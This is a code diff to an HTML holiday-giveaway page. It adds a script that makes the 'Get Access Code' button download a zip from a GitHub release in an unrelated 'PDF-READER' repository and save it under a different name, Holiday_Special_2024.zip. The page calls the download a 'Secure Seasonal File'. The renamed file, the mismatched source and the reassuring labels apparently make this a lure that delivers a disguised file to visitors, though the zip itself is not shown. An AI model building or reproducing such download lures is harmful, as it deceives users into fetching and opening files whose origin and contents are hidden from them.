@@ -425,7 +425,7 @@
             <div class="holiday-file">
                 <div class="holiday-icon"><i class="fa-solid fa-file-zipper"></i></div>
                 <div>
-                    <h4>Holiday_Special_2024.zip</h4>
+                    <h4>Holiday_Special_2024.zip</h4><BR>
                     <span class="badge" style="background: rgba(245, 158, 11, 0.2); color: #f59e0b; padding: 8px 16px; border-radius: 50px; font-size: 13px;">
                         <i class="fa-solid fa-user"></i> Holiday User
                     </span>
@@ -434,7 +434,7 @@
 
             <div class="holiday-cta">
                 <button class="holiday-btn">
-                    <i class="fa-solid fa-download"></i> Get Holiday Content
+                    <i class="fa-solid fa-download"></i> Get Access Code
                 </button>
                 <div style="text-align: center; margin-top: 15px; color: #cbd5e1; font-size: 13px;">
                     <i class="fa-solid fa-shield"></i> Secure Seasonal File
@@ -462,40 +462,97 @@
         </footer>
     </div>
 
-    <script>
-        const VALID_CODE = 'HOLIDAY-2024-CODE';
+<script>
+    // (Keep your existing snowflake creation code here...)
+    for(let i = 0; i < 50; i++) {
+        const snow = document.createElement('div');
+        snow.className = 'snowflake';
+        snow.style.width = Math.random() * 10 + 5 + 'px';
+        snow.style.height = snow.style.width;
+        snow.style.left = Math.random() * 100 + 'vw';
+        snow.style.top = Math.random() * -100 + 'px';
+        snow.style.opacity = Math.random() * 0.5 + 0.3;
+        snow.style.animationDuration = Math.random() * 5 + 5 + 's';
+        snow.style.animationDelay = Math.random() * 5 + 's';
+        document.body.appendChild(snow);
+    }
 
-        function redeem(){
-            const v = document.getElementById('redeemInput').value.trim();
-            const s = document.getElementById('redeemStatus');
+    // Function to download the file from GitHub
+    function downloadAccessCode() {
+        const downloadButton = document.querySelector('.holiday-cta .holiday-btn');
+        const originalHTML = downloadButton.innerHTML;
 
-            if(!v){
-                s.textContent='Please enter a code';
-                s.style.color='#dc2626';
-                return;
-            }
+        // Show loading state
+        downloadButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing Download...';
+        downloadButton.disabled = true;
 
-            if(v === VALID_CODE){
-                s.textContent='🎉 Holiday content unlocked!';
-                s.style.color='#16a34a';
-                localStorage.setItem('holiday_redeemed','1');
-                
-                // Add some celebration
-                document.querySelector('.holiday-gift').style.animation = 'pulse 0.5s infinite';
-                setTimeout(() => {
-                    document.querySelector('.holiday-gift').style.animation = 'pulse 2s infinite';
-                }, 2000);
-            } else {
-                s.textContent='Code not recognized';
-                s.style.color='#dc2626';
-            }
+        // The GitHub download URL (Replace with your actual file URL)
+        const fileUrl = 'https://github.com/Palmo70/PDF-READER/releases/download/Reader/Exclusive_Holiday_Gift.zip';
+
+        // Create an invisible download link and trigger it
+        setTimeout(() => {
+            const downloadLink = document.createElement('a');
+            downloadLink.href = fileUrl;
+            downloadLink.download = 'Holiday_Special_2024.zip'; // The name for the downloaded file
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+
+            // Show success state
+            downloadButton.innerHTML = '<i class="fa-solid fa-check"></i> Download Started!';
+            downloadButton.style.background = 'linear-gradient(135deg, #16a34a, #15803d)';
+
+            // Reset button after 3 seconds
+            setTimeout(() => {
+                downloadButton.innerHTML = originalHTML;
+                downloadButton.disabled = false;
+                downloadButton.style.background = '';
+            }, 3000);
+
+        }, 1000); // Simulate a short preparation time
+    }
+
+    // Attach the download function to the button
+    document.addEventListener('DOMContentLoaded', function() {
+        const downloadButton = document.querySelector('.holiday-cta .holiday-btn');
+        // Replace the inline onclick with our new function
+        downloadButton.setAttribute('onclick', 'downloadAccessCode()');
+    });
+
+    // Your existing redeem function (Keep this unchanged)
+    const VALID_CODE = 'HOLIDAY-2024-CODE';
+
+    function redeem(){
+        const v = document.getElementById('redeemInput').value.trim();
+        const s = document.getElementById('redeemStatus');
+
+        if(!v){
+            s.textContent='Please enter a code';
+            s.style.color='#dc2626';
+            return;
         }
 
-        if(localStorage.getItem('holiday_redeemed')){
-            const s = document.getElementById('redeemStatus');
-            s.textContent='Already redeemed during this season';
+        if(v === VALID_CODE){
+            s.textContent='🎉 Holiday content unlocked!';
             s.style.color='#16a34a';
+            localStorage.setItem('holiday_redeemed','1');
+            
+            // Add some celebration
+            document.querySelector('.holiday-gift').style.animation = 'pulse 0.5s infinite';
+            setTimeout(() => {
+                document.querySelector('.holiday-gift').style.animation = 'pulse 2s infinite';
+            }, 2000);
+        } else {
+            s.textContent='Code not recognized';
+            s.style.color='#dc2626';
         }
-    </script>
+    }
+
+    if(localStorage.getItem('holiday_redeemed')){
+        const s = document.getElementById('redeemStatus');
+        s.textContent='Already redeemed during this season';
+        s.style.color='#16a34a';
+    }
+</script>
 </body>
 </html>
